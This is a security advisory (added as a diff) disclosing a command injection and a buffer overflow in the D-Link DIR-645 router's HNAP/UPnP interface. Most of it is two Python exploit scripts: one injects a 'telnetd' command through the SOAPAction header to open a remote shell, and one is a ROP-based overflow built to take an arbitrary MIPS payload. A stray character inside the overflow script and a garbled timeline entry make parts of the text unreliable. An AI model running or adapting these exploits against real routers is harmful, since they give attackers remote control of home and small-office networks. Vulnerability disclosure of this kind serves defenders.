@@ -1,0 +1,77 @@
+## Advisory Information
+
+Title: Dlink DIR-645 UPNP Buffer Overflow
+Vendors contacted: William Brown <william.brown@dlink.com> (Dlink)
+Release mode: Released
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.
+
+## Product Description
+
+DIR-645 -- Whole Home Router 1000 from Dlink. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+I have come across 2 security issues in DIR-645 firmware which allows an attacker on wireless LAN and possibly WAN network to execute command injection and buffer overflow attack against the wireless router. I have provided exploit scripts written in python that give details of the exploits. The buffer overflow does not have a payload at this time, however if you watch the exploit in a debugger, then it can be clearly seen that the payload uses ROP techniques to get to stack payload which is a bunch of C's for now on the stack. It can be replaced with any payload that works on MIPS little endian architecture.
+
+## Details
+
+# Command injection
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + 'test;telnetd -p 9656;test\r\n' + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+----------------------------------------------------------------------------------------------------------------------
+
+
+# Buffer overflow
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+exploit_buffer = "POST /HNAP1/ HTTP/1.0\r\nHOST: 10.0.0.1\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";pt;"+"B"*158
+exploit_buffer+="C"*50+"Z"*46
+
+
+exploit_buffer+="\xb4\x67\xb3\x2a" 
+
+exploit_buffer+="\xd0\xeb\xb4\x2a"
+exploit_buffer+="VVVV"
+a
+exploit_buffer+="\x7c\xba\xb1\x2a" 
+exploit_buffer+="K"*16
+
+exploit_buffer+="\x44\x3b\xb0\x2A"
+exploit_buffer+="A"*36
+
+exploit_buffer+="\xf0\x5e\xb0\x2A"  
+exploit_buffer+="H"*16
+ 
+exploit_buffer+="C"*212+"\r\n" + "1\r\n\r\n"
+ 
+print "[+] sending exploit_bufferfer size", len(exploit_buffer)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.1", 80))
+s.send(exploit_buffer)
+----------------------------------------------------------------------------------------------------------------------
+
+
+## Report Timeline
+
+* Jan 22, 2015: Vulnerability found by Samuel Huntley by William Brown.
+* Feb 15, 2015: Vulnerability is patched by Dlink
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
